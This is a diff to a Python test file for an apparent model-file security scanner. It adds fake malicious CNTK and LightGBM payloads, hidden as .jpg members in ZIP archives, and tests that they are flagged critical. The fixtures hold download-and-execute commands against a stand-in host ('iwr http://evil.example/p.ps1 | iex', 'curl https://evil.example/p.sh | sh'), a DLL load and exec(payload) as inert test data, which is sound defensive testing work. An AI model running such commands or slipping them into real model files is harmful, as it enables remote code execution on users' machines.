@@ -36,6 +36,25 @@ def _npy_payload() -> bytes:
     return payload.getvalue()
 
 
+def _malicious_cntkv2_payload() -> bytes:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    return (
+        prefix
+        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
+        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
+        + (b"A" * 96)
+        + b") exec(payload) "
+    )
+
+
+def _malicious_lightgbm_payload() -> bytes:
+    return (
+        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
+        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
+    )
+
+
 def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
     assert (
         rewrite_extracted_member_location(
@@ -1690,6 +1709,48 @@ class TestZipScanner:
             entry["path"] == f"{archive_path}:model.payload" and entry["type"] == "onnx"
             for entry in result.metadata["contents"]
         )
+
+    @pytest.mark.parametrize(
+        ("scanner_name", "payload"),
+        [("cntk", _malicious_cntkv2_payload()), ("lightgbm", _malicious_lightgbm_payload())],
+    )
+    def test_nested_member_routes_renamed_strict_signature_payload(
+        self,
+        tmp_path: Path,
+        scanner_name: str,
+        payload: bytes,
+    ) -> None:
+        archive_path = tmp_path / "outer.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(f"{scanner_name}.jpg", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert any(
+            entry["path"] == f"{archive_path}:{scanner_name}.jpg" and entry["type"] == scanner_name
+            for entry in result.metadata["contents"]
+        )
+        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
+            b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
+        ],
+    )
+    def test_nested_member_rejects_renamed_signature_near_match(self, tmp_path: Path, payload: bytes) -> None:
+        archive_path = tmp_path / "outer.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("near-match.jpg", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert any(
+            entry["path"] == f"{archive_path}:near-match.jpg" and entry["type"] == "unknown"
+            for entry in result.metadata["contents"]
+        )
+        assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
     def test_nested_member_routes_prefixed_misnamed_onnx_by_structure(self, tmp_path: Path) -> None:
         """Unknown leading protobuf content must not hide a nested ONNX member."""
